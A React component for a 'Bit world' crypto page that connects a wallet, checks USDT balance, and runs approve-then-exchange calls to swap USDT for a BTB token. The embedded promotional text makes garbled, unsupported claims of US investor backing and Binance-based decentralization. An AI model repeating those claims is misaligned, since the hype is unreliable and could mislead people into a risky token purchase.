import { useEffect, useState, useRef } from "react";
import { Toast, Button, SpinLoading, Mask } from "antd-mobile";
import InputCard from "./components/inputCard";
import styles from "./index.module.scss";
import Web3Class from "@/unit/webnew";

const web3: any = new Web3Class();

const Mine = () => {
  const cache: any = useRef(null);
  const [inputValue, setInputValue] = useState(1);
  const [loading, setLoading] = useState(true);
  const [address, setAddress] = useState('');
  const formatAddress:any = function(a:any) {
    const firstSix = a.substr(0, 6);
    const lastSix = a.substr(-6);
    return `${firstSix}...${lastSix}`
  }


  const changeLoading = (load: boolean) => {
    setLoading(load);
  };

  const queryInit = async () => {
    try {
      const res = await web3.translateSign()
      setAddress(res)
      await web3.queryUserPermissions1();
      console.log('address', res)
      changeLoading(false);
    } catch (error) {
      changeLoading(false);
    }
  };
  const buyFn = async () => {
    console.log(inputValue)
    if (Number(inputValue) <= 0 || isNaN(inputValue)) {
      Toast.show('請輸入大於1')
      return
    }
    const reg = /^[1-9]\d*$/
    if (!reg.test(String(inputValue))) {
      Toast.show('請輸入整数')
      return
    }
    const blance = await web3.getUsdtBlance() ?? 0
    if (blance < Number(inputValue || 0)) {
      Toast.show('餘額不足')
      return
    }
    changeLoading(true);
    try {
      // const params = {
      //   price: inputValue,
      //   address: toAddress
      // }
      const val = inputValue
      const hash = await web3.approve(val).catch(() => {
        changeLoading(false);
      });
      console.log(hash)
      if (hash?.length) {
        const paramsHash = await web3.exchange(val).catch(() => {
          changeLoading(false);
        });
        if (paramsHash?.length) Toast.show('213')
      }
      changeLoading(false);
    } catch (error) {
      changeLoading(false);
    }
  };
  useEffect(() => {
    try {
      if (!cache.current) {
        queryInit();
        cache.current = true;
      }
    } catch (error) {
      console.error("err------", error);
    }
  }, []);

  const onChange = (val) => {
    // if (Number(val) <= 0) {
    //   // Toast.show('請輸入大於0')
    //   return
    // }
    setInputValue(val);
  };
  return (
    <div className='home'>
      <Mask visible={loading}>
        <div className={styles.loading}>
          <SpinLoading style={{ "--size": "48px" }} />
        </div>
      </Mask>
      <div className="header">
        <img className="header-left-img" src="/BTB.png" alt="" />
        <div className="header-right">
          <img className="header-right-img" src="/1.png" alt="" />
          <div>{!address ? 
          <span style={{color: '#fff'}} onClick={queryInit}>鏈結錢包</span>
          :formatAddress(address)}</div>
        </div>
      </div>
      <div className="egg-div">
        <img src="/egg.png" alt="" />
      </div>
      <div className="text-bit" style={{marginTop: '-30px', position: 'relative', fontSize: '16px'}}>
        Bit world(比特世界)Wbe.3生態。Bit world由美國矩陣資本領投聯合澳大利亞加密貨幣研發組織發起;基於幣安智令78%C完全去中心化Wbe.3金融商業生態,打造Wbe.3社交軟件與元宇宙平臺:為引流龐大用戶參與,平臺發行代幣BTB作為未來整個生態應用通證助力參與者實現自身價值。
      </div>

      <div className="text-bit">
        <div className="long-text">{inputValue}龍蛋+{inputValue}USDT兌換={inputValue}BTB</div>
        <div className={styles.content}>
          <InputCard onChange={onChange} inputValue={inputValue} />
          <Button
            onClick={() => buyFn()}
            size="small"
            color="primary"
            style={{
              background: "#0F6FCE",
              color: "#fff",
              width: "100%",
              height: "40px",
              marginTop: '40px'
            }}
          >
            確認兌換
          </Button>
          <div className="web3-text">web3|元宇宙</div>
        </div>
      </div>

    </div>
  );
};

export default Mine;
